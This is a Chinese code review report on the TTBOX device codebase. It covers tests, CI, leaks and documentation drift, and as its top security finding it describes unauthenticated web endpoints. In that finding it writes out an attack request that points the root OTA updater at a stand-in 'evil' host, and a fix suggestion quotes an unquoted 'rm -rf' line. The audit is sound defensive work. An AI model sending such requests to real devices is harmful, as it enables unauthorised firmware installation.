# TTBOX 代码库八荣八耻审查报告

- **审查对象**：`main-335f4114` @ `d246609`「V1.0.46 收口：代码全 C++，Python 只做脚本编排（业主要求）」
- **审查方式**：只读（Read / Grep / Glob / `git log` / `wc` / `ls`）。**未修改任何源文件**，未执行 `git commit` / `checkout`。
- **审查范围**：全部 16 个顶层目录 + 820 个文本源文件
- **审查者**：寇豆码（软件工程师）

---

## 一、总体评级

### **良好**

**理由**：C++ 核心层（4.6 万行）工程质量明显高于一般嵌入式项目——零裸 `new`/`delete`、零空 `catch`、detach 线程带完整生命周期注销、RAII 与 `std::lock_guard` 覆盖 239 处；测试投入（2.06 万行 C++ 单测 + 1.05 万行 Python 用例 + 417 个 C++ `TEST()` + 51 个 `add_test`）与生产代码同量级，且有 6 道自动化架构门禁主动防止退化。主要风险集中在**安全边界（Web 层鉴权整体退役 + `0.0.0.0` 监听）**与**前端单文件规模**，而非业务逻辑正确性。

> ⚠️ **与任务简报的两处事实更正**（详见第五节）：
> 1. 简报称「tests 只有 541 行 Shell —— 测试覆盖极薄」，**与实际相反**。`tests/` 目录确实只有 541 行，但它是**板端集成脚本**，不是单测目录。真实单测在 `core/tests`（20634 行 C++ + 858 行 Python）与 `plugins/web/tests`（10515 行 Python / 505 个测试函数）。
> 2. 简报引用的部分行数已过期：`10-flow.js` 实际 **6195 行**（非 5470）、`panel.css` **5284 行**（非 4529）、`IpcServer.cpp` **1240 行**（非 1047）。

---

## 二、按八条戒律逐条审查

### 第一荣耻：认真查询 vs 瞎猜接口

- **发现**：**未发现瞎猜接口的问题，反而有主动防退化机制**。这是本仓最强的部分之一。
- **证据**：`scripts/ttbox_conventions_gate.sh:9-22` 定义了 11 条断言，把"同一事实只能有一份字面量"落成可执行命令：
  ```bash
  # ⑤ 跨语言同值常量：socket / web 端口 / EDID attempts / 心跳 60·180 逐值相等（B-CONST-2）
  # ⑪ 无开发机绝对路径：禁 /mnt/g/WORKBUDDY… / C:/Users/… （这类路径在别人机器上必然不存在）
  ```
- **补充证据**：上一版提交主动**删除**了两套 Python 影子控制器，理由写明"与 C++ 两份实现可能同时误解算法，V1.0.43 的 τ=MT 错误两边犯一模一样的错 ⇒ **互验形同虚设**"（`git show HEAD` commit body）。这是对"重复实现导致假设失效"的清醒认知。
- **建议**：**不必修**。这是本仓的标杆实践。
- **影响面**：无（勿动）。

---

### 第二荣耻：寻求确认 vs 模糊执行

- **发现**：决策留痕充分。关键取舍均标注定案编号（`D1`/`D9`/`D04`/`M2.07`/`V1.0.46`），可追溯到具体日期与依据章节。
- **证据**：`plugins/web/bin/ttbox-web.py:560-563` 对"删除 LAN 黑名单"这一**有争议的破坏性决策**写明了理由而非默默删除：
  ```python
  # 现状是"看起来在拦、其实全放行"：名单来源脚本未进 payload ⇒ 名单恒空 ⇒ fail-open。
  # 坏掉的安全功能比没有更危险（使用者以为被挡住了）⇒ Web 层判定、缓存、端点一并删除
  ```
  注：该段仍保留"LAN 黑名单整块下线"的注释，但 `_enforce_gate` docstring（`:602`）仍写着"LAN 黑名单 403 + 激活 gate"——**注释与实现已漂移**（见第六荣耻）。
- **建议**：**修**（仅注释文案，1 行）。决策本身是对的，但残留 docstring 会误导后续维护者以为还有黑名单。
- **影响面**：`plugins/web/bin/ttbox-web.py:602` 单行；`plugins/web/lib/gate.py:66` 同款文案。

---

### 第三荣耻：人类确认 vs 臆想业务

- **发现**：业务规则有明确的 fail-closed 默认值，未见"为让测试通过而臆造业务语义"的痕迹。
- **证据**：`plugins/web/lib/cloud_client.py:43-46` 主动把占位密钥**清空**并说明理由，而不是留一个能跑通的假值：
  ```python
  # 注：DEFAULT_APP_SECRET 保留为符号（值为空串）仅为兼容既有导入；不再是任何"真值"。
  DEFAULT_APP_SECRET = ''
  ```
  且 `_request()` 有前置守卫（`:140-141`）：`app_secret` 缺失即报"云端凭据未配置"，**空串永不落到签名函数**。
- **证据**：`plugins/web/static/panel/10-flow.js:3010-3011` 拒绝用假数据哄用户：
  ```javascript
  // 报"待实现"而不是"可扩容"——后者会让用户以为按钮点一下就成了。
  return "待实现";
  ```
  这正是"诚实呈现业务能力边界"的典范。
- **建议**：**不必修**。
- **影响面**：无（勿动）。

---

### 第四荣耻：复用现有 vs 重复造轮

- **发现**：**无重复实现**。多处疑似双轨经核实均为"翻译层"而非"重写层"，且有门禁钉死。
- **证据①（JS 侧）**：跨文件函数名去重检查——15 个 JS 文件、约 8100 行，**同名函数重复定义 0 处**。
- **证据②（FOV 换算）**：`plugins/web/lib/capture_geometry.py:60,71` 的 `_fov_factor_clamp` / `_fov_radius_to_factor`，在 `core/src` 中**搜不到同名 C++ 实现**（`grep fov_factor|fov_radius_to|FovFactor core/src core/include` → 0 命中）。二者职责不同：Python 侧只做**表单语义归一化**，实际 FOV 运算在 C++。不构成重复造轮。
- **证据③（门禁）**：`plugins/web/tests/test_tools_python_is_orchestration_only.py`（10 条断言）明确禁止"影子控制器模块 / Python 重定义产品类 / 复刻控制公式与 3D 物理"，并强制 `selftest.py` 必须 `subprocess` 调 C++ 回放器。
- **发现（唯一真问题）**：**文件规模重复**——`plugins/web/static/panel/10-flow.js` 6195 行承载 342 个函数；`plugins/web/static/panel.css` 5284 行仅 758 个选择器块；`core/CMakeLists.txt` 1323 行。
- **证据**：
  ```
  6195 plugins/web/static/panel/10-flow.js   ← 342 个函数
  5284 plugins/web/static/panel.css          ← 758 个 { 块
  1323 core/CMakeLists.txt
  ```
- **缓解证据（重要）**：`10-flow.js` 并非无结构堆砌。文件头 `:1-37` 写明三层架构（`00-const` 数据层 / `01..09` 页签层 / `10-flow` 流程层），并给出**实测 call graph**：`01..09` 之间零互相调用，本文件 → `01..09` 有 93 条边、其中 81% 集中于 5 个渲染入口。且该约定由 `test_web_panel_layers.py` 守卫测试强制。
- **建议**：`10-flow.js` → **缓**（有守卫测试 + 清晰层次，拆分风险大于收益，属"能跑且被保护"的状态）。`panel.css` → **修**（5284 行 / 758 块 = 平均每块 7 行，且 `.power-button` 重复 22 次、`.mobile-action-head` 重复 22 次，属可安全收敛的重复）。`core/CMakeLists.txt` → **缓**（构建脚本，1323 行尚可维护）。
- **影响面**：`panel.css` 拆分需同步 `plugins/web/static/panel/*` 与 `index.html` 的 `<link>`，并跑 `plugins/web/tests/test_web_console_parity.py`（352 行结构比对用例）验证。

---

### 第五荣耻：主动测试 vs 跳过验证

- **发现**：**测试投入与生产代码同量级，且有主动防退化门禁**。此项是本仓第二大优点。
- **证据（规模）**：
  | 位置 | 规模 | 说明 |
  |---|---|---|
  | `core/tests/*.cpp` | **20634 行 / 92 文件** | 417 个 `TEST()`，51 个 `add_test` |
  | `plugins/web/tests/` | **10515 行 / 49 文件** | 505 个测试函数 |
  | `ttbox_platform/tests/` | 591 行 / 10 文件 | |
  | `framework/tests/` | 603 行 / 8 文件 | |
  | `tools/ota/` | 739 行 | 含 `test_verify.py` 420 行 |
  | **合计 Python** | **约 13,400 行 / 78 文件** | |
- **证据（防止漏跑）**：`pyproject.toml:37-42` 的注释记录了一次真实的漏跑事故并已修复：
  ```toml
  # P6-2026-10-01：原先只列 2 套 ⇒ 裸入口漏跑 plugins/web/tests 的 482 条。
  # ★ core/tests 也在内（2026-10-04）：那里放的是 **C++ 代码的结构守卫**
  #   ...漏列就会"没人跑"——而没跑过的检查等于没有检查。
  testpaths = ["framework/tests", "ttbox_platform/tests", "plugins/web/tests", "core/tests"]
  ```
- **证据（架构守卫测试）**：`core/tests/test_core_app_split_layout.py`（224 行）锁 Application 四 TU 的成员归属；`test_usbproxy_socket_race.py` 锁 socket 竞态；`test_preview_and_targeting_v31.py` 源码级断言。这类"架构即测试"的做法能防住纯逻辑单测防不住的架构腐化。
- **证据（提交同步率）**：近 15 次提交中，绝大多数功能提交**同时携带测试文件变更**（如 `core/tests/test_det_trace.cpp +169`、`test_fitts_aim.cpp +192`、`test_web_fitts_param_surface.py +221`）。HEAD 提交新增 10 条门禁并自报"ctest 44/44；pytest 789 passed"。
- **发现（真实缺口）**：**无 CI 配置文件**。`git ls-files | grep -iE "\.github|gitlab-ci|Jenkinsfile|azure-pipelines"` → **0 命中**。所有门禁（`ctest` / `pytest` / `ttbox_conventions_gate.sh` / `check_links.py`）全靠人工触发，README `:187-199` 只给了命令、未给强制执行机制。
- **建议**：**修**（补一个最小 CI：`.github/workflows/ci.yml` 跑 `ctest` + `pytest` + 口径门禁三个命令即可）。这不是"锦上添花"，而是让前四项门禁从"写了"变成"生效了"——**没跑过的检查等于没有检查**（这句是仓库自己在 `pyproject.toml:41` 写的）。
- **影响面**：新增 `.github/workflows/ci.yml`；无源码改动。注意交叉编译依赖 aarch64 toolchain，CI 需按 `README:163-186` 的 host-only 路径配置。

---

### 第六荣耻：遵循规范 vs 破坏架构

> 本条含**唯一的真实高危问题**（安全边界），单列 Top 5 第 1 条。

- **发现（🔴 高危）**：**Web 层鉴权语义整体退役（D1 定案）**，配合 `0.0.0.0` 监听，使**同网段任意设备可直接触发 OTA 安装 / 关机 / 重启**。
- **证据①（鉴权退役是明示决策）**：`plugins/web/bin/ttbox-web.py:600-612`
  ```python
  @app.before_request
  def _enforce_gate():
      """★ M2.07 唯一入口执法点（D1/D9）：LAN 黑名单 403 + 激活 gate。
      鉴权语义已整体退役（D1）：所有 API 免密直通，安全边界由网络层承担。"""
  ```
  同款文案另见 `plugins/web/lib/gate.py:66`。
- **证据②（网络层防护实际不存在）**：`plugins/web/lib/settings.py:44` → `LISTEN_HOST = '0.0.0.0'`。而代码注释声称"安全边界由网络层承担"，但：
  - `deploy/` 下 19 个文件中**无任何防火墙/iptables/nftables 配置**，仅 systemd 单元与配置模板；
  - `image/artifacts/selfcheck-2026-09-26.txt:198-199` 明确记录出厂状态：**"ufw status 应为 inactive" ⇒ 无防火墙拦截**；
  - LAN 黑名单本身已被主动删除（`ttbox-web.py:560-563`：名单来源脚本未进 payload ⇒ 恒空 ⇒ fail-open ⇒ 整块下线）。
  
  ⇒ **"安全边界由网络层承担"这一前提在出厂配置下不成立。**
- **证据③（危险端点确实免密可达）**：`plugins/web/tests/test_web_freeauth_gate.py:112-115` 用测试**固化**了这一行为：
  ```python
  # 危险动作免密直通（dry_run 不真关机）
  assert client.post('/api/system/reboot', json={'dry_run': True}).status_code == 200
  assert client.post('/api/system/poweroff', json={'dry_run': True}).status_code == 200
  ```
  且 OTA 安装同样免密（`test_freeauth_gate.py:117-130`，`POST /api/ota/install` 带任意 `https://` URL 即落任务文件）。
- **缓解措施（已存在，不应忽略）**：
  - `plugins/web/lib/power.py:45-58` + `ttbox-web.py:782-800`：电源动作先问 `systemd-logind` 的 `CanReboot`/`CanPowerOff`，polkit 拒绝则返回 403 ⇒ **关机/重启实际被 polkit 拦住**（Web 以非 root `ttbox` 身份运行）。
  - `plugins/web/lib/ota.py:104` 有 `capabilities.ota` 授权位门禁；`:112-118` 对 `key_id`/`version` 做白名单正则（防路径穿越 ⇒ 防止攻击者替换 root 验签公钥）、强制 `https://`。
- **风险收敛后的真实敞口**：**免密切换固件**。攻击者只需同网段发一个 `POST /api/ota/install {"url":"https://evil/x.tgz"}`，若能拿到**任何一份被 `deploy/keys/ttbox-ota-2026b.pub` 认可的签名包**，即可触发 root 更新器。签名校验本身是强边界，但"谁能触发下载"完全无门槛。关机/重启因 polkit 而非致命。
- **建议**：
  - 对 **`/api/ota/install`** → **修**。建议加"同源/局域网来源校验"或一次性 nonce（可复用现有 `cloud_session.json` 的 0600 落盘机制，`ttbox-web.py:646`），成本低、收益大。**注意此改动会使 `test_web_freeauth_gate.py:117` 用例红**，需同步改测试——属预期，不是障碍。
  - 对**全端点免密**本身 → **缓**。这是 D1 的产品定案（面板免密登录，简化交付），且有 polkit + 授权位 + 签名三重下游防线。**不建议推翻决策**，但**必须修正"安全边界由网络层承担"这句错误前提**（见第二荣耻），改为如实描述"依赖 polkit + capabilities + 签名三重门禁，Web 层不设鉴权"。
- **影响面**：`plugins/web/lib/ota.py:97-143`（加门禁）、`plugins/web/bin/ttbox-web.py:602,606` 与 `plugins/web/lib/gate.py:66`（文案）、`plugins/web/tests/test_web_freeauth_gate.py`（用例）。

- **发现（🟡 中危）**：`usbproxy/device-libusb.cpp` 有 **7 处裸 `new` 无对应 `delete`**（`:78` / `:467` / `:548` / `:560` / `:689` / `:694` / `:706`），全仓 `delete` 仅 7 次。属 C 风格遗留（该文件是 libusb C 互操作层）。
- **证据**：`:828-834` 已把泄漏当**已知取舍**显式记录，且理由正确：
  ```c
  /* Freeing now would be a use-after-free if a callback is still
     pending.  Leak instead: this only happens at teardown. */
  fprintf(stderr, "interrupt ring: EP%02x still has %d transfers in flight,"
      " leaking ring to avoid use-after-free\n", ...);
  ```
- **对比**：`core/src` + `core/include` 全域 **`= new` 与 `delete` 命中 0 次**，`malloc` 1 处对 `free` 12 处 ⇒ **核心 C++ 层内存管理是干净的**（对比 core，usbproxy 是明显的质量洼地）。
- **建议**：**缓**。仅 teardown 路径泄漏，不是稳态增长，不影响长期运行（进程退出即回收）。若要修，优先用 RAII 包装 `interrupt_ring`，但**必须与 `:829` 的 use-after-free 防护一起改**，单独改会引入更严重 bug。
- **影响面**：`usbproxy/device-libusb.cpp` 全文；`usbproxy/proxy.cpp` / `mouse_control.cpp` 同属该风格。

- **发现（🟢 已妥善处理，示例级）**：`StatsCollector::absorb`（`core/src/common/Stats.hpp:47-58`）存在**嵌套双锁**（`mutex_` + `other.mutex_`），形式上是死锁风险面。
- **证据**：该实现有两道正确的防护——① 入口 `if (this == &other) return;` 自吸收守卫；② `other` 为 `const&`，且全部 7 个生产调用点（`core/src/rknn/WorkerPool.cpp:486-497`、`core/src/runtime/CoreRuntime.cpp:422-424`）均为"聚合者吸收 worker 的局部统计"，**方向单一，不存在 A↔B 互吸**。锁内只做 `vector` 追加，无 IO、无回调、无日志。
- **建议**：**不必修**。AB-BA 死锁在本调用图下不可达。
- **影响面**：无（建议在 `absorb` 上方加一行注释说明"禁止双向互吸"，成本 1 行，但非必须）。

---

### 第七荣耻：诚实无知 vs 假装理解

- **发现**：文档注释中的**认知诚实度极高**——大量注释写明"实测依据""为什么不用更简单的写法""旧做法为什么错"。抽查 3 处：
- **证据①（记录实测证据而非猜测）**：`core/src/capture/V4L2Capture.cpp:272`
  ```cpp
  //   实测证据（板端 192.168.0.120，uptime 4.6 天）：
  ```
  `core/src/preview/PreviewModule.cpp:424` 甚至记录了**同类 bug 的历史教训**：
  ```cpp
  //   析构时 joinable 的 std::thread 照样 terminate（与 HidForwarder 是同一类坑）。
  ```
- **证据②（记录"为什么看似不成立"）**：`core/src/ipc/IpcServer.cpp:487-495` 解释了 detach 线程为何必须吞异常——**若异常逃逸会导致 `std::terminate` 整个 Core 且连接槽位永久泄漏**，并给出可观测症状（"客户端连接成功却读不到响应"）。这是把隐性风险显性化的典范。
- **证据③（主动登记已知缺陷）**：`usbproxy/device-libusb.cpp:829-834`（见上条，主动记录"故意泄漏以避免 use-after-free"）。
- **证据④（主动记录自己犯过的错）**：`plugins/web/static/panel/10-flow.js:3704-3711`
  ```javascript
  //   实测：轮询每 1.5s 调一次本函数，每次 filters.innerHTML="" 整体重建，
  ```
  以及 `README.md:250` 后的大规模"常见问题"章节。
- **发现（🟡 唯一漂移点）**：**README 落后于实际配置**。`README.md:195` 写：
  ```
  # Python 侧（裸入口跑全量，testpaths 已含 framework / ttbox_platform / plugins/web 三套件）
  ```
  但 `pyproject.toml:42` 实际是**四套件**（2026-10-04 新增 `core/tests`）。README 未同步。
- **证据**：`pyproject.toml:39-41` 明确记录了这次变更及理由：
  ```toml
  # ★ core/tests 也在内（2026-10-04）：那里放的是 **C++ 代码的结构守卫**
  #   ...漏列就会"没人跑"——而没跑过的检查等于没有检查。
  ```
- **建议**：**修**（README `:195` 一行文案，"三套件"→"四套件（含 core/tests 的 C++ 结构守卫）"）。这类漂移会让人以为 C++ 结构守卫是可选的。
- **影响面**：`README.md:195` 单行。

- **发现（🟡 数字断言陈旧）**：`docs/architecture/P4-P9-收口报告-2026-10-01.md:125,460` 写"web pytest **482 passed**"，而当前 `plugins/web/tests` 已有 505 个测试函数。文档作为**历史收口报告**，数字本就该定格在当日——**这不算错误，不必改**（仅在此备注，避免后续读者误当现状）。
- **建议**：**不必修**（历史报告性质）。但 `docs/architecture/web结构优化方案-后端与面板双拆-2026-10-02.md:205-209` 用 482 作为多处改造的**验收基线**，若后续复用该方案需更新基线。
- **影响面**：无（仅复用该方案时需留意）。

---

### 第八荣耻：谨慎重构 vs 盲目修改

- **发现**：**重构纪律有硬约束保护**，多处注释显示"曾因盲目重构引入 bug，遂加门禁"的闭环。
- **证据①（门禁即重构护栏）**：`core/CMakeLists.txt` 中密集的护栏引用，典型如 `:262-274`：
  ```cmake
  #  · 护栏：core/tests/test_usbproxy_socket_race.py（3 条源码级 ——
  ```
  重构与护栏成对出现，说明"改一处 → 补一条守卫"已成为肌肉记忆。
- **证据②（重构前先量化基线）**：`docs/architecture/web结构优化方案-后端与面板双拆-2026-10-02.md:118,136` 反复强调**为什么不能一次性改**：
  ```
  **为什么不一次性全改**：`hub.call` 是 S3/S4 定下的机制，正是它让 482 个测试
  **这一层是硬约束**。删了它 482 个测试直接红。
  ```
  即：把"测试全绿"当作重构的安全网，并**明确记录了哪些东西不能碰**。
- **证据③（机械搬移的可追溯性）**：`plugins/web/lib/profile_translate.py:1-9` 记录搬移的精确边界与依赖接缝：
  ```python
  从 ``plugins/web/bin/ttbox-web.py`` 整块**原样搬出**（实现一行未改），
  * `_get_runtime_profile` 是**测试 monkeypatch 锚点（29 处）**，必须留在入口
  ⇒ 本模块只在**调用时**经 ``hub.call()`` 向入口取，不在 import 期快照。
  ```
  连"哪 29 个测试会 monkeypatch 它"都记下了 ⇒ 下一个人搬移时不会踩坑。
- **发现（🟡 唯一隐患）**：`10-flow.js` 6195 行 / 342 函数是**未来重构的高压线**。当前安全（有三层架构约定 + `test_web_panel_layers.py` 守卫），但缺乏 lint / format / 复杂度门禁。
- **证据**：`git ls-files | grep -iE "\.clang-format|\.eslintrc|\.prettierrc|ruff|\.flake8|editorconfig"` → **0 命中**。全仓无任何格式化/静态检查配置。
- **建议**：`10-flow.js` 拆分 → **缓**（有守卫测试兜底，且层次已清晰；**在无 CI 的情况下贸然拆分 6195 行前端文件，风险高于收益**——若真要动，先补 CI 第五荣耻那条，再动手）。补 `.clang-format` / `.eslintrc` → **可以修**（纯增量、不改行为、统一后续风格）。CSS `!important` → **不必修**（`panel.css` 仅 5 处、`designer.css` 0 处、`motion_training.css` 5 处，量很小，不构成"硬覆盖"问题）。
- **影响面**：新增 `.clang-format` / `.eslintrc.json`（无源码改动）；`panel.css` 拆分触及 `index.html` + panel 目录。

---

## 三、高危问题 Top 5

按 `风险 × 出现频率` 排序。

### 🔴 1. Web 层全端点免密 + `0.0.0.0` 监听，且"网络层承担安全边界"前提不成立

- **精确位置**：`plugins/web/lib/settings.py:44`（`LISTEN_HOST = '0.0.0.0'`）、`plugins/web/bin/ttbox-web.py:600-612`、`plugins/web/lib/gate.py:66`
- **风险**：同网段任意设备可 `POST /api/ota/install {"url":"https://..."}` 触发 **root 权限**的更新器拉取任意 https 源。关机/重启因 polkit 被拦（`ttbox-web.py:790-799`）不致命，但 OTA 触发无门槛。
- **频率**：1 次 HTTP 请求即可，无需认证、无需 cookie。
- **加重因素**：`deploy/` 无防火墙配置；`image/artifacts/selfcheck-2026-09-26.txt:198-199` 证实出厂 `ufw` 为 **inactive** ⇒ 唯一依赖的"网络层边界"不存在。LAN 黑名单已被主动下线（`ttbox-web.py:560-563`）。
- **已有的缓解**（不应低估）：`capabilities.ota` 授权位（`lib/ota.py:104`）、`key_id`/`version` 白名单正则防路径穿越（`:112-114,135-136`）、强制 https（`:117`）、root 侧签名校验（`deploy/keys/ttbox-ota-2026b.pub`）。

### 🟠 2. 无 CI，全部门禁靠人工触发

- **精确位置**：`git ls-files | grep -ciE "\.github|gitlab-ci|Jenkinsfile"` → **0**；命令仅记录于 `README.md:187-199`
- **风险**：`ctest`（44 用例）、`pytest`（789 用例）、`ttbox_conventions_gate.sh`（11 条断言）、`check_links.py` 四道门禁全部**不会自动执行** ⇒ 架构腐化只能靠人记得跑。
- **频率**：持续性——每次提交都可能绕过。
- **注**：仓库自己在 `pyproject.toml:41` 写下"**没跑过的检查等于没有检查**"，却让这些检查依赖人工触发。这是最高性价比的改进点。

### 🟠 3. `usbproxy` 裸 `new` 泄漏（7 处，`delete` 仅 7 次）

- **精确位置**：`usbproxy/device-libusb.cpp:78, 467, 548, 560, 689, 694, 706`
- **风险**：teardown 路径内存泄漏。**已在 `:828-834` 显式登记为有意取舍**（避免 use-after-free），非稳态增长，不影响长期运行。
- **频率**：仅进程退出/环形传输拆除时。
- **对比**：核心 `core/src` 裸 `new`/`delete` 命中 **0** ⇒ 质量洼地集中在 libusb C 互操作层，非架构性缺陷。

### 🟡 4. `10-flow.js` 6195 行单文件，无 lint/format/复杂度门禁

- **精确位置**：`plugins/web/static/panel/10-flow.js`（342 函数，最长 `bindPresetAndImportEvents` 仅 129 行）
- **风险**：单文件规模已超可维护阈值。当前有 `test_web_panel_layers.py` 守卫 + 清晰三层架构注释，**风险被大幅缓解**；但全仓无任何 lint 配置，后续无约束地增长缺乏刹车。
- **频率**：持续累积。
- **减轻因素**：最长函数仅 129 行（**函数粒度本身健康**）——问题在文件总量，不在单函数复杂度。

### 🟡 5. README 与实际配置漂移（测试套件数）

- **精确位置**：`README.md:195`（"三套件"）vs `pyproject.toml:42`（四套件，2026-10-04 新增 `core/tests`）
- **风险**：读者会以为 C++ 结构守卫（`test_core_app_split_layout.py` 等 7 个文件 / 858 行）不在裸入口内，可能手工排除。
- **频率**：每次查阅 README 的人。
- **减轻因素**：实际执行 `pytest` 会正常跑到 core/tests（配置是对的），只是**文档描述滞后**。

---

## 四、建议的修复优先级清单

### P0（必须修）

| # | 事项 | 文件:行 |
|---|---|---|
| P0-1 | `/api/ota/install` 增加触发方来源校验（一次性 nonce / 同源校验），复用 `cloud_session.json` 0600 机制；同步更新 `test_web_freeauth_gate.py:117` 用例 | `plugins/web/lib/ota.py:97-143` |
| P0-2 | 修正"安全边界由网络层承担"这一**错误前提**（出厂 `ufw` inactive，边界实际不存在），改为如实描述三重下游防线 | `plugins/web/bin/ttbox-web.py:602,606`；`plugins/web/lib/gate.py:66` |

> 注：不建议推翻 D1"全端点免密"的产品决策——它有 polkit + `capabilities` + 签名三重下游防线，且面板免密是交付简化诉求。P0-1 是最小侵入的收敛点。

### P1（应该修）

| # | 事项 | 文件:行 |
|---|---|---|
| P1-1 | 补最小 CI（`ctest` + `pytest` + `ttbox_conventions_gate.sh` + `check_links.py`），让四道门禁从"写了"变"生效了" | 新增 `.github/workflows/ci.yml` |
| P1-2 | README 测试套件数"三套件"→"四套件（含 core/tests 的 C++ 结构守卫）" | `README.md:195` |
| P1-3 | `_enforce_gate` docstring 删除已失效的"LAN 黑名单 403"描述 | `plugins/web/bin/ttbox-web.py:602` |
| P1-4 | `panel.css` 收敛重复选择器（`.power-button` 22 次 / `.mobile-action-head` 22 次），按 `面板`/`移动端` 拆分 | `plugins/web/static/panel.css`（5284 行 / 758 块） |

### P2（可以修）

| # | 事项 | 文件:行 |
|---|---|---|
| P2-1 | 新增 `.clang-format` / `.eslintrc.json`（纯增量、不改行为） | 新增 |
| P2-2 | `StatsCollector::absorb` 上方加注释"禁止双向互吸"（防未来误用引入 AB-BA 死锁） | `core/src/common/Stats.hpp:47` |
| P2-3 | `usbproxy` 的裸 `new` 改 RAII，**必须与 `:829` 的 use-after-free 防护一并改** | `usbproxy/device-libusb.cpp:78,467,548,560,689,694,706` |
| P2-4 | `a9_*` / `image/steps/00_verify.sh` 等 13 个脚本补 `set -euo pipefail`（多为探测/自检脚本，风险低） | `image/00_recon.sh`、`image/steps/00_verify.sh`、`scripts/a9_*.sh` 等 |
| P2-5 | `a9_pkg_install.sh` 变量加引号（`rm -rf $HID/... $SRC` → `rm -rf "$HID"/... "$SRC"`），共 189 处未加引号展开（多数无害，`wait $PID` 类除外） | `scripts/a9_pkg_install.sh:9,13,14` |
| P2-6 | 拆分 `10-flow.js` —— **建议在 P1-1 CI 落地之后再做** | `plugins/web/static/panel/10-flow.js` |
| P2-7 | 拆分 `core/CMakeLists.txt`（1323 行） | `core/CMakeLists.txt` |

---

## 五、我拿不准的地方（诚实无知声明）

> 遵循第七荣耻：以下结论**明确标注推测性质**，需业主/团队确认。我没有把推测写成断言。

### 5.1 必须由用户确认的判断

1. **【需确认】Web 全端点免密（D1）是否是当前有效的商业决策？**
   我看到的是代码注释标注 `D1 定案` + `M2.07`，但**未找到对应的业主签字文档**。我搜索 `docs/` 下 "D1 鉴权退役" 只命中代码注释，**没有找到决策原文**（`grep -rn "D1" docs/architecture/*.md | grep -i "鉴权\|免密"` → 0 命中）。
   ⇒ **我不确定这是"业主知情同意的风险接受"还是"实现过程中逐步退化的结果"**。这是 Top 1 的定性关键，直接决定 P0-1 该怎么做。**请确认是否有 D1 决策文档。**

2. **【需确认】"网络层承担安全边界"在客户实际网络环境是否成立？**
   代码假设由网络层兜底，但出厂 `ufw` inactive（`image/artifacts/selfcheck-2026-09-26.txt:198`）。**若客户部署在受控局域网/专网，该假设可能成立；若设备接入酒店/展会等开放 WiFi，则不成立。** 我无法从代码判断实际部署场景。

3. **【需确认】`/api/ota/install` 的签名校验强度是否足以作为唯一防线？**
   我看到 `deploy/keys/ttbox-ota-2026b.pub` 且更新器 `_check_safe_id` 会防路径穿越，但**我没有逐行读完 root 更新器的验签实现**（`scripts/ttbox_ota_updater.py` 616 行，我只确认了它在流程中被调用）。**因此"必须拿到合法签名包"这一推断我无法 100% 证实。**

4. **【需确认】测试套件的期望规模？**
   当前 `pytest` 789 passed（提交 body 自报）、`ctest` 44/44。**我无法判断这对本项目是"足够"还是"仍不足"**——需要业主给出覆盖率目标（如"核心算法分支 ≥ 80%"）。我只能客观报告规模，未评估充分性。

### 5.2 我的推测（有证据但未定论）

5. **【推测】`usbproxy` 的泄漏是历史遗留而非疏漏。**
   依据：该文件整体是 C 风格 libusb 互操作层，`delete` 仅 7 次而 `new` 大量，且 `:829` 有显式取舍说明。**但我未查 git 历史确认引入时间**，故仅作推测。

6. **【推测】`10-flow.js` 的分层约定是刻意设计而非事后追认。**
   依据：文件头 `:1-37` 有实测 call graph 数据（"93 条调用边，81% 集中于 5 个渲染入口"）+ 加载顺序注释 + `test_web_panel_layers.py` 守卫。**这种量化描述通常是实测而非事后编造**，但我未验证该测试当前是否真的在裸 `pytest` 下被收集到（它在 `plugins/web/tests/`，`pyproject.toml:42` 已含该路径，**推测会跑，未实跑验证**）。

7. **【推测】CSS 的 22 次重复选择器主要来自响应式覆写而非真重复。**
   依据：`.power-button` / `.mobile-action-head` 都是"面板 ↔ 移动端"同名元素，易在媒体查询中多次出现。**我抽查了次数但未逐条 diff 属性值**，故无法断定全部可安全合并。**动手前必须逐条比对，否则会改坏样式。**

### 5.3 本次审查未能覆盖的部分（诚实声明）

- **未运行任何测试/编译**（只读约束）。所有"门禁通过""测试全绿"均引用**提交 body 与代码注释的自述**，非我实测。
- **未逐行读完**以下大文件：`10-flow.js`（6195 行，读了头部/关键片段/函数长度分布）、`panel.css`（5284 行，仅统计）、`proxy.cpp`（1953 行）、`core/CMakeLists.txt`（1323 行）。**因此"无重复实现""无裸 new"等结论基于 grep 全量扫描 + 关键片段抽读，不是逐行通读。**
- **`core/third_party/`（onnxruntime 等 6000+ 行第三方头文件）完全未审**——按惯例第三方代码不纳入项目规范审查，但请确认这一假设符合业主预期。
- **`core/tests/*.json` / `*.onnx` / `*.bgr` 等二进制测试资产未审。**

---

## 附：覆盖率与客观数据修正

为便于业主核对，本报告对任务简报中的客观数据做如下**实测更正**：

| 项目 | 简报值 | 实测值 | 说明 |
|---|---|---|---|
| `10-flow.js` 行数 | 5470 | **6195** | 简报数据已过期 |
| `panel.css` 行数 | 4529 | **5284** | 简报数据已过期 |
| `IpcServer.cpp` 行数 | 1047 | **1240** | 简报数据已过期 |
| `ModelRegistry.cpp` 行数 | 940 | **1054** | 简报数据已过期 |
| `core/CMakeLists.txt` 行数 | 1230 | **1323** | 简报数据已过期 |
| C++ 测试规模 | "tests 仅 541 行 Shell，覆盖极薄" | **`core/tests` 20634 行 C++ / 417 个 `TEST()` / 51 个 `add_test`** | 简报把 `tests/`（板端集成脚本）当成了单测目录 |
| Python 测试规模 | 未提及 | **约 13400 行 / 78 文件** | 分布于 4 个 tests 目录 + tools/ota |
| CI 配置 | 未提及 | **无** | `git ls-files` 0 命中 |
| 裸 `new`/`delete`（core/src） | 未提及 | **0 处** | 内存管理是强项 |
| 未加引号变量展开（shell） | 未提及 | **189 处** | 多数无害 |

---

*报告完*